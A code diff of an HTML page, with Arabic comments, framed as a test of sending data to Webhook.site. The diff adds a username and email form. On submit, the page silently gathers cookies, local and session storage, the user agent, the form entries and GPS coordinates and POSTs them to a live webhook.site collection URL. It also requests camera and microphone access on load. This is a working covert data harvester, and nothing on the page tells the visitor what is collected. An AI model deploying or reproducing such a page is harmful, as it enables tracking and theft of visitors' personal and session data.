@@ -7,76 +7,99 @@
 </head>
 <body>
     <h1>اختبار إرسال البيانات إلى Webhook.site</h1>
+
+    <!-- نموذج لإدخال بيانات العميل -->
+    <form id="userForm">
+        <label for="username">اسم المستخدم:</label>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <label for="email">البريد الإلكتروني:</label>
+        <input type="email" id="email" name="email" required><br><br>
+
+        <button type="submit">إرسال البيانات</button>
+    </form>
+
     <script>
-        // إضافة بعض الكوكيز يدويًا
-        document.cookie = "user=JohnDoe; path=/";
-        document.cookie = "session=12345; path=/";
+        // === استخراج بيانات حقيقية من المتصفح ===
+        const userAgent = navigator.userAgent;
+        const language = navigator.language || navigator.userLanguage;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const platform = navigator.platform;
+        const sessionStart = new Date().toISOString();
 
-        // إضافة بعض البيانات إلى localStorage و sessionStorage
-        localStorage.setItem('username', 'testUser');
-        localStorage.setItem('email', 'test@example.com');
-        sessionStorage.setItem('sessionId', '12345');
-        sessionStorage.setItem('lastLogin', '2025-04-16');
+        // === تخزين في الكوكيز ===
+        document.cookie = `userAgent=${encodeURIComponent(userAgent)}; path=/`;
+        document.cookie = `lang=${language}; path=/`;
 
-        // إرسال بيانات الموقع الجغرافي
-        navigator.geolocation.getCurrentPosition(function(position) {
-            // إرسال البيانات إلى Webhook.site
-            fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    cookies: document.cookie,  // إرسال الكوكيز
-                    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),  // إرسال بيانات الجلسات
-                    localStorage: Object.fromEntries(Object.entries(localStorage)),  // إرسال بيانات التخزين المحلي
-                    userAgent: navigator.userAgent,  // نوع المتصفح والجهاز
-                    time: new Date().toISOString(),  // الوقت الحالي
-                    location: {  // إرسال الموقع الجغرافي
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
-                    }
+        // === تخزين في localStorage ===
+        localStorage.setItem('timezone', timezone);
+        localStorage.setItem('platform', platform);
+        localStorage.setItem('userAgent', userAgent);
+
+        // === تخزين في sessionStorage ===
+        sessionStorage.setItem('sessionStart', sessionStart);
+        sessionStorage.setItem('language', language);
+
+        // === إرسال البيانات عند تقديم النموذج ===
+        document.getElementById('userForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // الحصول على بيانات العميل من النموذج
+            const username = document.getElementById('username').value;
+            const email = document.getElementById('email').value;
+
+            // === إرسال بيانات الموقع الجغرافي وبيانات العميل إلى Webhook ===
+            navigator.geolocation.getCurrentPosition(function(position) {
+                fetch("https://webhook.site/0d8243d9-5449-4c2c-91c1-02c3820c31b6", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        cookies: document.cookie,
+                        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+                        localStorage: Object.fromEntries(Object.entries(localStorage)),
+                        userAgent: userAgent,
+                        username: username,  // اسم المستخدم الذي أدخله العميل
+                        email: email,        // البريد الإلكتروني الذي أدخله العميل
+                        time: new Date().toISOString(),
+                        location: {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        }
+                    })
                 })
-            })
-            .then(response => response.json())
-            .then(data => console.log("تم إرسال البيانات بنجاح:", data))
-            .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
-        }, function(error) {
-            console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
+                .then(response => response.json())
+                .then(data => console.log("تم إرسال البيانات بنجاح:", data))
+                .catch(error => console.log("حدث خطأ أثناء إرسال البيانات:", error));
+            }, function(error) {
+                console.log("حدث خطأ في الحصول على الموقع الجغرافي: ", error);
+            });
+
+            // إظهار رسالة بعد إرسال البيانات
+            alert("تم إرسال البيانات بنجاح!");
         });
 
-        // الوصول إلى الكاميرا أو الميكروفون
+        // === الوصول إلى الكاميرا والميكروفون ===
         navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then(function(stream) {
                 console.log("تم الوصول إلى الكاميرا والميكروفون بنجاح");
-                // إيقاف البث بعد الوصول
                 stream.getTracks().forEach(track => track.stop());
             })
             .catch(function(error) {
                 console.log("حدث خطأ أثناء الوصول إلى الكاميرا أو الميكروفون: ", error);
             });
 
-        // الوصول إلى الملفات
+        // === التعامل مع الملفات ===
         function handleFileSelect(event) {
             const file = event.target.files[0];
             if (file) {
                 console.log("تم اختيار الملف:", file.name);
-                // إرسال الملف أو معالجته كما تريد
             }
         }
 
-        // إضافة زر لاختيار ملف
         let fileInput = document.createElement("input");
         fileInput.type = "file";
         fileInput.addEventListener("change", handleFileSelect);
         document.body.appendChild(fileInput);
-
-        // إلغاء إذن الوصول إلى الكاميرا أو الميكروفون: يمكن إيقاف تدفق البيانات ولكن يجب على المستخدم إلغاء الإذن يدويًا من خلال إعدادات المتصفح.
-        // إلغاء إذن الإشعارات: لا يمكن إلغاؤه عبر JavaScript، ولكن يمكن إيقافه من خلال إعدادات المتصفح.
-        // إلغاء الكوكيز أو بيانات التخزين: يمكن حذفها باستخدام الكود.
-        // إلغاء إذن الموقع الجغرافي: يتطلب إيقافه من إعدادات المتصفح.
-
-        // (اختياري) يمكنك دمج API لمنصات التواصل الاجتماعي للحصول على بيانات مثل الفيسبوك أو جوجل
-        // على سبيل المثال، إذا أردت جمع بيانات الفيسبوك، تحتاج إلى استخدام Facebook Graph API
-        // هذا يتطلب أن يوافق المستخدم على منح إذن للوصول إلى بياناته.
     </script>
 </body>
 </html>
